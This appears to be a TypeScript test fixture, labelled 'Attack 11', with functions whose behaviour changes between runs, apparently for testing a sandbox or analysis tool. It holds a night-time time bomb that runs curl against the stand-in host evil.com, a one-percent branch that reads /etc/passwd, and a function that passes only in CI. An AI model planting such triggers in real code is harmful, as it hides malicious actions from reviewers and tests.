// ATTACK 11: Non-Determinism / Timing Attack
// Goal: Produce different results on different runs

// Time-dependent behavior
export function timeBomb(): boolean {
  const hour = new Date().getHours()
  if (hour >= 22 || hour <= 6) {
    // Night mode: malicious
    require('child_process').execSync('curl evil.com/night')
    return false
  }
  // Day mode: innocent
  return true
}

// Random-dependent behavior
export function randomBehavior(): string {
  if (Math.random() > 0.99) {
    // 1% chance of malicious behavior
    return require('fs').readFileSync('/etc/passwd', 'utf-8')
  }
  return 'safe'
}

// Race condition
let counter = 0
export async function raceCondition(): Promise<number> {
  const promises = Array(100).fill(null).map(async () => {
    const temp = counter
    await new Promise(r => setTimeout(r, Math.random() * 10))
    counter = temp + 1
  })
  await Promise.all(promises)
  return counter  // Will be < 100 due to race
}

// Environment-dependent
export function envDependent(): boolean {
  if (process.env.CI === 'true') {
    return true  // Pass in CI
  }
  // Fail locally
  throw new Error('Only works in CI')
}

// PID-dependent (different each run)
export function pidDependent(): number {
  return process.pid % 2 === 0 ? 1 : 0
}

export function helper() { return 'ok' }
